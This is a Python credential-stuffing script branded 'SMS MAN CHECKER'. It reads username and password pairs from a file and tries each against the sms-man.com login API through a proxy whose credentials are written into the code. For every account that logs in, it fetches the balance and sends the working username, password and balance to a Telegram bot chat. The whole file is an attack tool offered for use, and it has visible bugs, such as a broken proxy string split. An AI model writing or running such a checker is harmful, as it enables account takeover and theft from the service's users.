import requests
import json
import telebot
try:
    import pyfiglet
    import requests
    import os
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install pyfiglet')
os.system('clear')
Z = '\033[1;31m'
F = '\033[2;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'
logo = pyfiglet.figlet_format('@SetpPro')
print(Z + logo)
o = ("====================================SMS MAN CHECKER============================")
print(F + 'Made by @SetpPro')
# Define the API endpoint URLs
login_url = "https://api.sms-man.com/control/get-api-key"
balance_url = "https://api.sms-man.com/control/get-balance"

# Define your proxy information
proxy_info = "http:rp.proxyscrape.com:6060:2hvurscrwm9i9ia:u79dtnnkoxvyp0w"

# Split proxy information into its components
proxy_parts = proxy_info.split(":")
proxy_server = proxy_parts[0]
proxy_port = proxy_parts[1]
username = proxy_parts[2]
password = proxy_parts[3]

print(
    "------------------------------------ My Telegram : @SetpPro-----------------SMS MAN CHECKER-------------------------")
# Define your Telegram bot token
bot_token = input(f' Enter Token : ')

# Create a Telegram bot instance
bot = telebot.TeleBot(token=bot_token)

# Define your chat ID
chat_id = input(f' Enter ID  : ')

# Function to log in and get the API key using the proxy
def get_api_key(username, password):
    data = {
        "login": username,
        "password": password
    }
    headers = {
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "User-Agent": "okhttp/4.9.1"
    }
    proxies = {
        "http": f"http://{username}:{password}@{proxy_server}:{proxy_port}"
    }
    response = requests.post(login_url, data=json.dumps(data), headers=headers, proxies=proxies)
    response_data = response.json()
    return response_data.get("apiKey")

# Function to get the balance using the API key and proxy
def get_balance(api_key):
    headers = {
        "Host": "api.sms-man.com",
        "User-Agent": "okhttp/4.9.1"
    }
    params = {
        "token": api_key
    }
    proxies = {
        "http": f"http://{username}:{password}@{proxy_server}:{proxy_port}"
    }
    response = requests.get(balance_url, headers=headers, params=params, proxies=proxies)
    response_data = response.json()
    return response_data.get("balance")

if __name__ == "__main__":
    # Read account information from a text file
    with open("accounts.txt", "r") as file:
        accounts = file.readlines()
        for account in accounts:
            username, password = account.strip().split(":")
            api_key = get_api_key(username, password)
            if api_key:
                balance = get_balance(api_key)
                if balance:
                    # Format the output and send it to your Telegram bot
                    message = f"𝗛𝗜 𝗡𝗘𝗪 𝗔𝗖𝗖𝗢𝗨𝗡𝗧✪ ˼\n━━━━━━━━━━━━━━━━━\nᯓ TYPE » SMS MAN \nᯓ USERNAME « {username}\nᯓ PASSWORD » {password}\nᯓ BALANCE » {balance}\n━━━━━━━━━━━━━━━━━\n˹👨‍💻 𝗗𝗘𝗩 𝗕𝗬 @SetpPro"
                    bot.send_message(chat_id, message)
                    print(f"\033[92mAccount: {username}, Password: {password}, Balance: {balance}\033[0m")
                else:
                    print(f"\033[91mFailed balance : {username}\033[0m")
            else:
                print(f"\033[91mLogin failed {username}.\033[0m")

# Start the bot's listening loop
bot.polling(none_stop=True)